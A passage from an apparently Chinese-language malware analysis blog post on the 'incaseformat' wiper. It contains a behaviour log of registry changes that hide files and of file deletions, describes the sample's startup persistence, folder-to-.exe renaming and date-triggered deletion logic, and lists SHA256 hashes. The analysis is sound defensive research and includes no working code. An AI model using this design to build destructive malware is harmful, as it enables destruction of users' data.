17:25:53:524,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:&#39;01 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:25:53:534,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:&#39;02 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:25:53:551,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:&#39;00 00 00 00 &#39; ,	0x00000000 [操作成功完成。  ],	
17:25:54:434,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\$RECYCLE.BIN\S-1-5-21-655661564-3040666061-2252561177-1000\desktop.ini,	,	0x00000000 [操作成功完成。  ],	
17:25:54:443,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\3rd-party-licenses.txt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:447,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\ca-bundle.crt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:456,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\CHANGELOG,	,	0x00000000 [操作成功完成。  ],	
</code></pre><h2 id="2行为分析">2.行为分析</h2>
<p>在非删文件夹日期运行样本会创建C:\windows\tsay.exe，并将路径添加到开机自启的注册表中；</p>
<p>在删文件夹日期运行C:\windows\tsay.exe将会创建C:\windows\ttry.exe并执行起来，设置internet选项（不知道是拿来干啥）；</p>
<p>在非删文件夹日期运行C:\windows\ttry.exe，将会重置tsay.exe和启动项，然后将除c盘外的盘符中的文件夹，修改成文件夹名.exe，并修改注册表，隐藏文件夹后缀名（win10中并未生效）；</p>
<p>在删除文件夹日期运行C:\windows\ttry.exe，将会新建incaseformat.log，并删除其他文件。</p>
<h2 id="3样本分析">3.样本分析</h2>
<h3 id="31样本信息">3.1样本信息</h3>
<pre tabindex="0"><code>C:\Users\ALEE\Desktop\incaseformat样本&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile ttry.exe sha256
SHA256 的 ttry.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。
</code></pre><h3 id="32查壳情况">3.2查壳情况</h3>
<p>查一下壳，无壳delphi。</p>
<p><img src="/inc_images/2696940148582.png" alt=""></p>
<p>delphi程序使用<code>dede</code>和<code>idr</code>，可视化上要比直接使用<code>ida</code>好许多，这里使用的是<code>idr+ida</code>进行静态反汇编（<code>idr</code>查看结构，导出map，<code>ida</code>导入<code>map</code>，c代码生成，方便阅读）。</p>
<p>注：这里采用的时<code>ida7.5</code></p>
<h3 id="33静态分析">3.3静态分析</h3>
<p><code>idr</code>载入样本<code>ttry.exe</code>，查看<code>forms</code>，导出<code>map</code>。这里可以看到作者生存意识极强。</p>
<p><img src="/inc_images/1734812110161.png" alt=""></p>
<h4 id="formcreate分析">FormCreate分析</h4>
<p><code>ida</code>载入样本，导入<code>map</code>，查看<code>FormCreate</code>，<code>F5</code>代码生成，可以看到第61-73进行了一次文件是否存在的检查，不存在将进行自我复制。</p>
<p><img src="/inc_images/398113140163.png" alt=""></p>
<p>下方存在一次判断，如果为真，则将自身复制为ttry.exe，并新建进程启动。</p>
<p><img src="/inc_images/5034917158589.png" alt=""></p>
<h4 id="timer1timer分析">Timer1Timer分析</h4>
<p>该模块中有两个函数，从函数内进行分析，发现第一个函数存在驱动盘符读取的功能，第二个函数暂时不知道是什么功能……</p>
<p><img src="/inc_images/5336152186622.png" alt=""></p>
<p>进入函数<code>sub_44E5C8</code>函数观察上下文，</p>
<p><img src="/inc_images/713754179291.png" alt=""></p>
<p>进入<code>sub_44E54C</code>函数可以得知其功能是判断是否是有效磁盘。</p>
<p><img src="/inc_images/4288158175846.png" alt=""></p>
<h4 id="timer2timer分析">Timer2Timer分析</h4>
<p>该模块中有两个函数，第一个函数是磁盘信息的，第二个函数是删除文件及文件夹的函数。</p>
<p><img src="/inc_images/4515747158592.png" alt=""></p>
<p>在第37行到第60行，开始获取当前的年月日，如果年份小于2010或月份小于4月则不执行删除操作。如果大于2009或大于3月，却日期等于1、10、21、29号，则执行删除操作。</p>
<p><code>sub_44EC70</code>函数内容如下：</p>
<p><img src="/inc_images/1697453146459.png" alt=""></p>
<h4 id="timer3timer分析">Timer3Timer分析</h4>
<p>整个模块未引入其他函数，比较明显的是一些注册表操作</p>
<p><img src="/inc_images/3140339176625.png" alt=""></p>
<h4 id="timer4timer分析">Timer4Timer分析</h4>
<p>该模块的功能很简单，利用<code>TFileStream</code>文件流形式创建<code>incaseformat.log</code></p>
<p><img src="/inc_images/1496356169294.png" alt=""></p>
<h2 id="4结语">4.结语</h2>
<p>本次样本耗时很长，期间断断续续的进行了三四次，多线程是个好东西，就是不适合多长线程。分析过程中遇到的痛点和难点总结如下：</p>
<ul>
<li>注册表键值所对应的含义</li>
<li>delphi函数名称</li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
